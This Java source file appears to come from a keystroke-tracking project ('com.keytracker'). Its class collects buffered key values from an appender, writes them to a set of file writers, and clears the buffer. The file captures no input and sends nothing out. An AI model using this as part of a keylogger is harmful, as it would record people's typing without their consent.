package com.keytracker;

import com.keytracker.file.Writer;

public class BundledStoreMechanism implements StoreMechanism {
    private final Writer[] writers;
    private KeyAppender keyAppender;

    public BundledStoreMechanism(Writer... writers) {
        this.writers = writers;
    }

    @Override
    public void store() {
//        System.out.print(keyAppender.value());

        for (Writer writer : writers) {
            if (writer != null) writer.write(keyAppender.value());
        }
        keyAppender.clear();
    }

    @Override
    public void registerAppender(KeyAppender keyAppender) {
        this.keyAppender = keyAppender;
    }
}
